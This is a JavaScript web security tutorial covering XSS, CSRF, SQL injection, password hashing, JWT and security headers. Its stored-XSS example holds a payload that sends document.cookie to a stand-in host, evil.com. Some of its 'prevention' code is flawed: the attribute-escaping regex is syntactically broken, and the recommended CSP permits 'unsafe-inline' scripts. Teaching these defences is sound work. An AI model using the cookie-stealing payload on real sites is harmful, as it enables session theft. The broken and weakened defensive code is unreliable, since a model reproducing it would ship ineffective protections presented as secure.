# 📊 JavaScript Security Deep Dive

## Comprehensive Security Guide

---

## Table of Contents

1. [XSS Prevention](#xss-prevention)
2. [CSRF Protection](#csrf-protection)
3. [SQL Injection Prevention](#sql-injection-prevention)
4. [Authentication](#authentication)
5. [Secure Headers](#secure-headers)
6. [Security Best Practices](#security-best-practices)

---

## XSS Prevention

### Types of XSS Attacks

```javascript
// Reflected XSS - Malicious URL
// URL: example.com/search?q=<script>alert('XSS')</script>

// Stored XSS - Database injection
const maliciousUser = {
  username: '<script>document.location="evil.com/?c="+document.cookie</script>'
};

// DOM-based XSS
document.getElementById('output').innerHTML = userInput;
```

### Prevention Techniques

```javascript
// HTML Encoding
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Attribute Encoding  
function escapeAttr(str) {
  return str.replace(/["'&<>/g, char => ({
    '"': '&quot;',
    "'": '&#39;',
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '/': '&#47;'
  })[char]);
}

// Safe DOM Rendering
function safeRender(element, content) {
  element.textContent = content; // Safe, not innerHTML
}
```

### CSP Implementation

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline'; 
               style-src 'self' 'unsafe-inline';
               img-src 'self' data: https:;
               connect-src 'self' https://api.example.com;">
```

---

## CSRF Protection

### CSRF Token Implementation

```javascript
class CSRFProtection {
  constructor() {
    this.token = null;
  }

  generateToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    this.token = Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    return this.token;
  }

  validateToken(submittedToken) {
    return submittedToken === this.token && 
           this.token.length === 64;
  }

  // Middleware for Express
  middleware(req, res, next) {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
      return next();
    }
    
    const token = req.headers['x-csrf-token'] || 
                req.body._csrf;
    
    if (!this.validateToken(token)) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    
    next();
  }
}
```

### SameSite Cookies

```javascript
// Set secure cookie
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // 'lax' or 'strict'
});
```

---

## SQL Injection Prevention

### Parameterized Queries

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ SAFE - Parameterized
const query = 'SELECT * FROM users WHERE email = ?';
db.execute(query, [email]);

// ✅ SAFE - Named parameters
const query = 'SELECT * FROM users WHERE email = :email';
db.execute(query, { email: email });

// ✅ SAFE - ORM
const user = await User.findOne({ where: { email: email } });
```

### Input Validation

```javascript
const validationRules = {
  email: {
    pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    message: 'Invalid email format'
  },
  password: {
    minLength: 8,
    pattern: /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/,
    message: 'Password requires uppercase, lowercase, and number'
  }
};

function validateInput(data, rules) {
  const errors = {};
  
  for (const [field, rule] of Object.entries(rules)) {
    const value = data[field];
    
    if (rule.required && !value) {
      errors[field] = 'Required';
      continue;
    }
    
    if (rule.minLength && value.length < rule.minLength) {
      errors[field] = `Minimum ${rule.minLength} characters`;
    }
    
    if (rule.pattern && !rule.pattern.test(value)) {
      errors[field] = rule.message;
    }
  }
  
  return errors;
}
```

---

## Authentication

### Password Hashing

```javascript
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

async function hashPassword(password) {
  return bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// Usage
const hash = await hashPassword('mySecurePassword');
const isValid = await verifyPassword('mySecurePassword', hash);
```

### JWT Implementation

```javascript
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_EXPIRY = '24h';

function generateToken(user) {
  return jwt.sign(
    { 
      userId: user.id, 
      email: user.email,
      role: user.role 
    },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRY }
  );
}

function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch (error) {
    return null;
  }
}

function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const payload = verifyToken(token);
  
  if (!payload) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  req.user = payload;
  next();
}
```

---

## Secure Headers

### Headers Configuration

```javascript
const securityHeaders = {
  // Prevent MIME type sniffing
  'X-Content-Type-Options': 'nosniff',
  
  // Prevent clickjacking
  'X-Frame-Options': 'DENY',
  
  // XSS Protection
  'X-XSS-Protection': '1; mode=block',
  
  // Enforce HTTPS
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  
  // Content Policy
  'Content-Security-Policy': "default-src 'self'",
  
  // Referrer Policy
  'Referrer-Policy': 'strict-origin-when-cross-origin'
};

// Express middleware
function securityHeadersMiddleware(req, res, next) {
  for (const [header, value] of Object.entries(securityHeaders)) {
    res.setHeader(header, value);
  }
  next();
}
```

---

## Security Best Practices

### Security Checklist

```markdown
✓ Input Validation
  - Validate all user input
  - Use allowlist over denylist
  - Sanitize before storage

✓ Output Encoding
  - Escape HTML in user content
  - Use textContent over innerHTML
  - Encode URLs properly

✓ Authentication
  - Use strong password hashing (bcrypt)
  - Implement account lockout
  - Use 2FA when possible

✓ Session Management
  - Use secure, HttpOnly cookies
  - Implement session timeout
  - Regenerate session IDs

✓ Error Handling
  - Don't expose stack traces
  - Use generic error messages
  - Log internally

✓ Dependencies
  - Keep packages updated
  - Use npm audit
  - Remove unused dependencies
```

### Regular Security Audits

```bash
# Run security audits
npm audit

# Check for known vulnerabilities
npm audit --audit-level=high

# Update dependencies
npm update

# Use Snyk for monitoring
npx snyk test
```

---

## Summary

### Key Takeaways

1. **XSS**: Always escape output
2. **SQL**: Use parameterized queries
3. **Auth**: Hash passwords, use JWT
4. **Headers**: Implement security headers

---

*Last updated: 2024*